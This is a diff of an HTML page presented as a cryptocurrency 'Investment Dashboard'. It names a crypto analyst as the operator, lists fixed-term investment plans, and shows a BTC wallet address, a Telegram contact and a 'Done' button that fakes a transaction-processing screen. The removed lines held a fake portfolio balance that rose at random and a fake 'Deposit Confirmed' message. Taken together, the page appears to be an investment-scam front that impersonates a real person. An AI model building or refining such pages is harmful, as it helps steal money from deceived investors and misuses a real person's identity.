@@ -8,90 +8,71 @@
 <style>
 body {
     margin: 0;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-    background: radial-gradient(circle at top, #0f172a, #0b1220);
+    font-family: Arial, sans-serif;
+    background: #0f172a;
     color: white;
 }
 
-/* HEADER */
 header {
-    background: linear-gradient(135deg, #1e3a8a, #0f172a);
-    padding: 25px 15px;
+    background: #1e3a8a;
+    padding: 20px;
     text-align: center;
-    border-bottom: 1px solid rgba(255,255,255,0.05);
 }
 
 header img {
     display: block;
     margin: 15px auto;
     border-radius: 50%;
-    border: 3px solid rgba(34,197,94,0.4);
 }
 
-/* CONTAINER */
 .container {
     max-width: 900px;
     margin: auto;
-    padding: 18px;
-}
-
-/* CARDS */
-.card {
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.08);
-    backdrop-filter: blur(10px);
     padding: 20px;
-    border-radius: 16px;
-    margin-top: 18px;
 }
 
-/* PORTFOLIO */
-.portfolio-grid {
+.card {
+    background: #1e293b;
+    padding: 20px;
+    border-radius: 10px;
+    margin-top: 20px;
+}
+
+.plans {
     display: grid;
-    gap: 12px;
+    gap: 15px;
 }
 
-.port-box {
-    background: rgba(255,255,255,0.06);
-    border-radius: 12px;
+.plan {
+    background: #334155;
     padding: 15px;
+    border-radius: 10px;
 }
 
-.port-title {
-    font-size: 12px;
-    color: #94a3b8;
-}
-
-.port-value {
-    font-size: 22px;
-}
-
-.green {
-    color: #22c55e;
-}
-
-/* WALLET */
 .wallet {
-    background: rgba(14,165,233,0.15);
-    border: 1px solid rgba(14,165,233,0.3);
-    padding: 14px;
-    border-radius: 12px;
+    background: #0ea5e9;
+    padding: 15px;
+    border-radius: 10px;
     word-break: break-all;
+    font-weight: bold;
 }
 
-/* BUTTON */
 button {
     margin-top: 10px;
-    padding: 12px;
+    padding: 10px;
     border: none;
-    border-radius: 10px;
+    border-radius: 8px;
     cursor: pointer;
-    background: linear-gradient(135deg, #22c55e, #16a34a);
+    background: #22c55e;
     color: white;
+    font-weight: bold;
     width: 100%;
 }
 
-/* FOOTER */
+button:hover {
+    background: #16a34a;
+}
+
 footer {
     text-align: center;
     margin-top: 30px;
@@ -99,48 +80,34 @@ footer {
     color: #94a3b8;
 }
 
-/* LOADING */
+/* LOADING OVERLAY */
 #loadingOverlay {
     display: none;
     position: fixed;
-    inset: 0;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
     background: rgba(0,0,0,0.85);
     justify-content: center;
     align-items: center;
     flex-direction: column;
     z-index: 9999;
+    color: white;
 }
 
-/* MODAL */
-#successModal {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.92);
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-    z-index: 10000;
-}
-
-.modal-box {
-    background: rgba(255,255,255,0.06);
-    border: 1px solid rgba(34,197,94,0.4);
-    padding: 25px;
-    border-radius: 18px;
-}
-
-/* SPINNER */
 .spinner {
-    width: 50px;
-    height: 50px;
-    border: 4px solid rgba(255,255,255,0.2);
+    width: 45px;
+    height: 45px;
+    border: 4px solid #fff;
     border-top: 4px solid #22c55e;
     border-radius: 50%;
     animation: spin 1s linear infinite;
+    margin-bottom: 15px;
 }
 
 @keyframes spin {
+    0% { transform: rotate(0deg); }
     100% { transform: rotate(360deg); }
 }
 </style>
@@ -148,54 +115,50 @@ footer {
 
 <body>
 
-<!-- LOADING -->
+<!-- LOADING SCREEN -->
 <div id="loadingOverlay">
     <div class="spinner"></div>
     <h3>Processing transaction...</h3>
-</div>
-
-<!-- SUCCESS MODAL -->
-<div id="successModal">
-    <div class="modal-box">
-        <h2>✓ Deposit Confirmed</h2>
-        <p>Your transaction has been submitted successfully.</p>
-        <p>We will notify you once we receive your payment.</p>
-    </div>
 </div>
 
 <header>
     <h1>Investment Dashboard</h1>
     <p>Track plans and payment details</p>
 
-    <img src="file_00000000a508720c8a70e1680c2add19.png" width="160">
+    <img src="file_00000000a508720c8a70e1680c2add19.png"
+     alt="Profile Image"
+     width="180">
 
     <h2>Benjamin Cowen</h2>
-    <p>Bitcoin & Crypto Analyst</p>
+    <p>Bitcoin & Cryptocurrency Market Analyst</p>
+    <p>Providing educational market analysis, trend insights, and portfolio-tracking guidance for cryptocurrency investors.</p>
 </header>
 
 <div class="container">
 
-    <!-- PORTFOLIO -->
     <div class="card">
-        <h2>Portfolio</h2>
+        <h2>Investment Plans</h2>
 
-        <div class="portfolio-grid">
-            <div class="port-box">
-                <p class="port-title">Total Value</p>
-                <h3 class="port-value" id="portfolioValue">$12,850 <span class="green">+12.4%</span></h3>
+        <div class="plans">
+            <div class="plan">
+                <h3>Starter Plan</h3>
+                <p>$100 - 7 Days</p>
+            </div>
+
+            <div class="plan">
+                <h3>Standard Plan</h3>
+                <p>$500 - 14 Days</p>
+            </div>
+
+            <div class="plan">
+                <h3>Premium Plan</h3>
+                <p>$1000+ - 30 Days</p>
             </div>
         </div>
     </div>
 
-    <!-- PLANS -->
     <div class="card">
-        <h2>Investment Plans</h2>
-        <p>Starter • Standard • Premium</p>
-    </div>
-
-    <!-- WALLET -->
-    <div class="card">
-        <h2>Wallet</h2>
+        <h2>Wallet Address</h2>
 
         <div class="wallet" id="wallet">
             bc1qrc4dz7k6zlth9nn4mx82qjnmyg6s3tty4up0mh
@@ -204,33 +167,29 @@ footer {
         <button onclick="copyWallet()">Copy Wallet</button>
         <button onclick="goToThankYou(this)">Done</button>
 
-        <p>Send BTC only</p>
+        <p>Send BTC only. Double-check address before sending.</p>
+    </div>
+
+    <div class="card">
+        <h2>Contact</h2>
+        <p>Telegram: @Ethervision35</p>
     </div>
 
 </div>
 
-<footer>© 2026 Investment Dashboard</footer>
-
-<!-- SOUND -->
-<audio id="ding" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
+<footer>
+© 2026 Investment Dashboard
+</footer>
 
 <script>
-
 function copyWallet() {
-    navigator.clipboard.writeText(document.getElementById("wallet").innerText);
+    const wallet = document.getElementById("wallet").innerText;
+
+    navigator.clipboard.writeText(wallet)
+        .then(() => alert("Wallet copied!"))
+        .catch(() => alert("Copy failed"));
 }
 
-/* ✅ AUTO GROW PORTFOLIO */
-let value = 12850;
-setInterval(() => {
-    let increase = Math.floor(Math.random() * 40);
-    value += increase;
-
-    document.getElementById("portfolioValue").innerHTML =
-        "$" + value.toLocaleString() + ' <span class="green">+12.4%</span>';
-}, 4000);
-
-/* ✅ SOUND + CONFIRM FLOW */
 function goToThankYou(btn) {
     btn.disabled = true;
     btn.innerText = "Processing...";
@@ -238,18 +197,9 @@ function goToThankYou(btn) {
     document.getElementById("loadingOverlay").style.display = "flex";
 
     setTimeout(() => {
-        document.getElementById("loadingOverlay").style.display = "none";
-        document.getElementById("successModal").style.display = "flex";
-
-        document.getElementById("ding").play();
-
-        setTimeout(() => {
-            window.location.href = "thankyou.html";
-        }, 2500);
-
-    }, 2000);
+        window.location.href = "thankyou.html";
+    }, 2500);
 }
-
 </script>
 
 </body>
